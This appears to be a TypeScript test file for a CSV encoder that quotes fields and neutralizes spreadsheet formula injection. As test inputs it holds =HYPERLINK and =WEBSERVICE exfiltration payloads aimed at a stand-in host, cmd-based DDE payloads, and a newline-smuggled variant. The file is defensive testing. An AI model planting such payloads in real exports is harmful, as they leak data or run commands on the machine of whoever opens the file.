// SPDX-License-Identifier: AGPL-3.0-only
// The CSV field encoder carries two invariants that must hold together: RFC 4180 structure (a value
// can never restructure the file) and formula neutralization (a value can never be executed by the
// spreadsheet that opens the file). The first was already true and must stay byte-identical; the
// second is the fix. Both halves are tested here, plus their interaction, since the payloads that
// matter contain quotes.

import { describe, expect, it } from 'vitest';
import { FORMULA_TRIGGERS, csvField } from './csv';

describe('csvField — RFC 4180 structure (unchanged behaviour)', () => {
  it('always quotes, so a value containing a comma cannot split the row', () => {
    expect(csvField('plain')).toBe('"plain"');
    expect(csvField('a,b')).toBe('"a,b"');
  });

  it('doubles an embedded quote', () => {
    // A username of `he"llo` would otherwise terminate the field early and shift every later
    // column of that row.
    expect(csvField('he"llo')).toBe('"he""llo"');
    expect(csvField('""')).toBe('""""""');
  });

  it('quotes a newline in place rather than letting it end the record', () => {
    expect(csvField('a\nb')).toBe('"a\nb"');
    expect(csvField('a\r\nb')).toBe('"a\r\nb"');
  });

  it('stringifies a number without losing it', () => {
    expect(csvField(200)).toBe('"200"');
    expect(csvField(0)).toBe('"0"');
    expect(csvField(1.5)).toBe('"1.5"');
  });

  it('emits an empty field for an empty value', () => {
    // The empty string has no first character to inspect; it must not become `"'"`.
    expect(csvField('')).toBe('""');
  });
});

describe('csvField — formula neutralization', () => {
  it('neutralizes every trigger character', () => {
    // Iterating the exported list rather than restating it: a trigger added to `FORMULA_TRIGGERS`
    // without the behaviour is what this is for.
    for (const trigger of FORMULA_TRIGGERS) {
      expect(csvField(`${trigger}danger`)).toBe(`"'${trigger}danger"`);
    }
    expect(FORMULA_TRIGGERS).toEqual(['=', '+', '-', '@', '\t', '\r']);
  });

  it('defuses the =HYPERLINK exfiltration payload, quotes and all', () => {
    // The finding's motivating case: an admin opening the audit export clicks one link and sends
    // the adjacent cell to the attacker. Note the two invariants composing — the apostrophe is
    // added first, then every inner quote is doubled.
    expect(csvField('=HYPERLINK("http://evil.example/?"&A1,"Click")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/?""&A1,""Click"")"',
    );
  });

  it('defuses =WEBSERVICE and the DDE command form', () => {
    expect(csvField('=WEBSERVICE("http://evil.example/x")')).toBe(
      '"\'=WEBSERVICE(""http://evil.example/x"")"',
    );
    // The classic DDE payload starts with `-`, not `=`, which is exactly why `-` is on the list.
    expect(csvField("-2+3+cmd|' /C calc'!A0")).toBe('"\'-2+3+cmd|\' /C calc\'!A0"');
    expect(csvField("@SUM(1+9)*cmd|' /C calc'!A0")).toBe('"\'@SUM(1+9)*cmd|\' /C calc\'!A0"');
  });

  it('only inspects the first character — an inner `=` is not a formula', () => {
    // Over-neutralizing would prefix ordinary syslog text; a spreadsheet only evaluates a cell
    // whose text *begins* with a trigger.
    expect(csvField('ifAlias=uplink')).toBe('"ifAlias=uplink"');
    expect(csvField('a+b')).toBe('"a+b"');
    expect(csvField('user@example.com')).toBe('"user@example.com"');
  });

  it('neutralizes a trigger that arrives with leading structure of its own', () => {
    expect(csvField('\t=1+1')).toBe('"\'\t=1+1"');
    expect(csvField('\r=1+1')).toBe('"\'\r=1+1"');
  });
});

describe('csvField — the deliberate leading-minus exemption', () => {
  it('leaves a plain negative number numeric', () => {
    // The decision, stated: `-5` is NOT neutralized. The Troubleshoot CSVs export a correlation
    // coefficient that is negative for every inverse correlation, so neutralizing would make that
    // column text for half its rows and numeric for the other half — a mixed-type column sorts
    // wrong silently, which is worse than the cosmetic cost of a uniformly-text one. A bare numeric
    // literal cannot name a function, a cell or a DDE target, so nothing is given up.
    expect(csvField('-5')).toBe('"-5"');
    expect(csvField(-5)).toBe('"-5"');
    expect(csvField('-0.87')).toBe('"-0.87"'); // a correlation `r`
    expect(csvField('-1e-7')).toBe('"-1e-7"'); // a slope_per_day in exponent form
    expect(csvField('-1E+5')).toBe('"-1E+5"');
    expect(csvField('-.5')).toBe('"-.5"');
    expect(csvField('-5.')).toBe('"-5."');
  });

  it('neutralizes anything else that merely starts like a number', () => {
    expect(csvField('-5+5')).toBe('"\'-5+5"');
    expect(csvField('-5;=1')).toBe('"\'-5;=1"');
    expect(csvField('-5%')).toBe('"\'-5%"');
    expect(csvField('-1e')).toBe('"\'-1e"');
    expect(csvField('-')).toBe('"\'-"');
    expect(csvField('-Infinity')).toBe('"\'-Infinity"');
  });

  it('does not let a trailing newline smuggle a payload past the exemption', () => {
    // Load-bearing: the exemption is a `^…$` regex, and in JS (unlike Python) `$` without the `m`
    // flag matches only at end of input. If that ever stopped being true, `-5\n=HYPERLINK(…)` would
    // be exempted as "a number" and shipped unneutralized.
    expect(csvField('-5\n=HYPERLINK("http://evil.example")')).toBe(
      '"\'-5\n=HYPERLINK(""http://evil.example"")"',
    );
    expect(csvField('-5\n')).toBe('"\'-5\n"');
    expect(csvField('-5\r')).toBe('"\'-5\r"');
  });

  it('exempts only `-`, since no other trigger can start a stringified number', () => {
    expect(csvField('+5')).toBe('"\'+5"');
    expect(csvField('=5')).toBe('"\'=5"');
    // Positive numbers were never affected — `String(5)` has no sign.
    expect(csvField(5)).toBe('"5"');
  });
});
